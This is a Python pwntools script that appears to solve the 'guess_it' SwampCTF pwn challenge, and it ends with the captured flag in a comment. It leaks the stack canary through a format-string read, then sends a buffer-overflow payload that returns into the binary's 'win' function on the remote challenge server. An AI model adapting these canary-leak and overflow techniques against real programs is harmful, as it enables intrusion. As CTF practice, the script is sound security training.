#!/usr/bin/env python3

from pwn import *

exe = './guess_it'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

host,port = 'chals.swampctf.com',64236

#p = process(exe)
p = remote(host,port)

padding = 8

p.sendlineafter(b'yet?',b"Yes")
p.recv()
p.sendlineafter(b'it?',b'%7$p')
p.recvline()
canary = int(p.recvline().strip().split()[1].decode(),16)
info('canary = 0x%x (%d)', canary, canary)
'''
payload = flat({
    8: p64(canary), # canary at offset of 8 bytes within the payload
    24: [p64(0x0000000000401016), elf.symbols['win'] ] # array of two elements at an offset of 24 bytes within the payload
})
'''
payload = flat(
    asm('nop')*padding,
    canary,
    asm('nop')*8,
    0x0000000000401016,
    elf.symbols['win'],
)

p.sendlineafter(b"> ", payload)
p.sendlineafter(b"> ", b"No")

p.interactive()

# flag : swampCTF{C0me_0n+1_didnt+3xp3ct_you+to}
